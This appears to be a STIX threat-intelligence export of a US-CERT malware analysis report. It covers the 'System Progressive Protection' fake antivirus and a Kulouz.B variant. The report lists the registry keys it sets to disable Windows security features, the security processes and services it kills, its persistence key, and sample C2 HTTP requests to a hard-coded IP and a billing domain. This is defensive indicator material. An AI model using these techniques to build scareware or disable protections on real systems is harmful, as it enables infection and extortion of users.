stix:STIX_Header.stix:Title: System Progressive Protection and Kulouz Malware Analysis
stix:STIX_Header.stix:Description:
On 10 October 2012, two files were submitted for analysis by a government agency. The first is a System Progressive Protection malware variant and the second is a Kulouz.B variant. Both pieces of malware call out to command and control (C2) domains.
This document incorporates data originally released as US-CERT MIFR-248594.

stix:Indicator.indicator:Description:
This file is associated with "System Progressive Protection" malware a variant of the "Win32/Winwebsec" malware family. The malware creates a new directory and puts a copy of itself in the following location: "%common_appdata%\[random name]\[random name].exe". The name of the created directory and the file name are the same and both 32 characters long.
The malware drops an additional file in the same directory. The name of the file is "[random name].ico".
The malware creates a named Mutex object. The name of the Mutex object is the same as the name generated for the files above but without extensions.
Next, the malware creates a new thread to "lower" the security settings of the infected system. The following actions are taken: The Windows Security Center is disabled. This is achieved by setting up or creating the following registry keys: [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center] "FirstRunDisabled"=dword:00000001 "AntiVirusDisableNotify"=dword:00000001 "FirewallDisableNotify"=dword:00000001 "UpdatesDisableNotify"=dword:00000001 "AntiVirusOverride"=dword:00000001 "FirewallOverride"=dword:00000001
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\svc] "AntiVirusDisableNotify"=dword:00000001 "AntiVirusOverride"=dword:00000001 "FirewallDisableNotify"=dword:00000001 "FirewallOverride"=dword:00000001 "UpdatesDisableNotify"=dword:00000001
Following processes are terminated, if they are running, on the infected system: "wscntfy.exe" "msascui.exe" "mpcmdrun.exe" "msmpeng.exe" "nissrv.exe" "msseces.exe"
Following are the list of Services that are stopped and disabled on the infected system: "wuauserv" "wscsvc" "windefend" "msmpsvc" "avgfws" "avgwd" "AVGIDSAgent" "AVG Security"
The malware sets up the following registry keys: [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] "HideSCAHealth"=dword:00000001 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\luafv] "Start"=dword:00000004 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore] "RPSessionInterval"=dword:00000000 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system] "EnableLUA"=dword:00000000 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender] "DisableAntiSpyware"=dword:00000001 Next, the malware creates Thread 2. This Thread is responsible for deleting the originally dropped executable.
To stay persistent on the system, the malware creates the following registry key: [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce] "[random name]"="%common_appdata%\\[random name]\\[random name].exe"
The malware creates two threads for the purpose of communicating with a C2 (command and control) location.
The malware downloads a file from a C2 and runs it on the system. The downloaded file is dropped as "%temp%\[random name].exe".
Below are examples of the HTTP communication: GET /api/urls/?ts=f50c09e8&affid=70300 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0);(b:2600;c:INT-2C60;l:09) Host: 103.4.225.41 Connection: Keep-Alive Cache-Control: no-cache Pragma: no-cache
GET /api/stats/install/?ts=f50c09e8&affid=70300&ver=3070010&group=srs HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0);(b:2600;c:INT-2C60;l:09) Host: 103.4.225.41 Connection: Keep-Alive Cache-Control: no-cache Pragma: no-cache
The "(b:2600;c:INT-2C60;l:09)" part of the User-Agent can be de-constructed as follows: "b:" + Internet Explorer Version Info taken from the "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Version" registry key; "c:" + data about processor derived by calling "cpuid"; "l:" + data about the locale on the system.
Next, the malware creates a shortcut on the Desktop with the properties as follows: Description = "System Progressive Protection" Show = true Working Directory = "%common_appdata%\[random name]\[random name].exe" Icon Location = "%common_appdata%\[random name]\[random name].ico" The malware terminates all the instances of the Internet Explorer running on the system.
The malware creates a clean up thread to delete files associated with Internet Explorer. All the files in the following directories are deleted: "%appdata%\Local\Microsoft\Internet Explorer\Recovery\Active" "%appdata%\Local\Microsoft\Internet Explorer\Recovery\High\Last Active" "%appdata%\Local\Microsoft\Internet Explorer\Recovery\High\Active" "%appdata%\Internet Explorer\Recovery\Last Active"" "%appdata%\Internet Explorer\Recovery\Active"
The malware creates a shortcut in the start menu with the properties similar to the shortcut created on the Desktop. The malware creates another thread to terminate all the processes that run under the user credentials. The malware won't terminate any of the processes running as a privileged user such as "SYSTEM", "LOCAL SERVICE, or "REMOTE SERVICE".
The following registry key is created: [HKEY_CURRENT_USER\Software\Microsoft\Installer\Products\[random name]] @=dword:00000001 The malware starts the GUI Application pretending to be an Anti-Virus product. There are five languages supported: English, French, German, Spanish and Portuguese. The fake Anti-Virus claims that the system is infected with the malware and solicits the user to register and pay money for the updates and system's "cleanup".
Below are an example of communication performed by the fake anti virus:
GET /p/?&lid=3070010&affid=70300&nid=EC910D5F&group=srs HTTP/1.1 Accept: */* Accept-Language: en-us Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Host: kilopaybilling.com Connection: Keep-Alive
The file hbpuhkud.exe (MD5: 942bf50bb791453db1b4fc51737d2b58) calls out to this URL to download malware.
The file hbpuhkud.exe (MD5: 942bf50bb791453db1b4fc51737d2b58) calls out to this URL to download malware.
The file hbpuhkud.exe (MD5: 942bf50bb791453db1b4fc51737d2b58) calls out to this URL.

This IP address was hard-coded into the malware. Additionally, the port, 84 was hard-coded. The malware calls out to this IP address, presumably for C2.
This IP address was also utilized in CIB-20121015-11 and CIB-20121015-19.

This IP address was hard-coded into the malware. Additionally, the port, 84 was hard-coded. The malware calls out to this IP address, presumably for C2.
This IP address was also utilized in IB-13-10788, CIB-20121102-02, and CIB-20121024.
